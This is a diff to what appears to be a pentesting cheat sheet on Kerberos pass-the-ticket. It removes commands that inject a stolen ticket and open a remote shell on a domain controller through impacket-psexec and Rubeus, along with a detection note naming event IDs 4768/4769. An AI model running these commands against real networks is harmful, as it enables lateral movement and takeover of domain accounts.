@@ -21,15 +21,3 @@ Inject a **TGT/TGS** into a session; no password/hash needed. Linux uses `KRB5CC
 
 ### Commands
 ```bash
-# ── Linux PTT ────────────────────────────────────────────────────────
-export KRB5CCNAME=/path/ticket.ccache
-impacket-psexec -k -no-pass corp.local/admin@dc01.corp.local
-
-# ── Windows Rubeus ──────────────────────────────────────────────────
-Rubeus.exe ptt /ticket:doIF...
-```
-
-### Detection
-**4768/4769** from a host that did not perform the initial auth; anomalous ticket lifetimes.
-
----
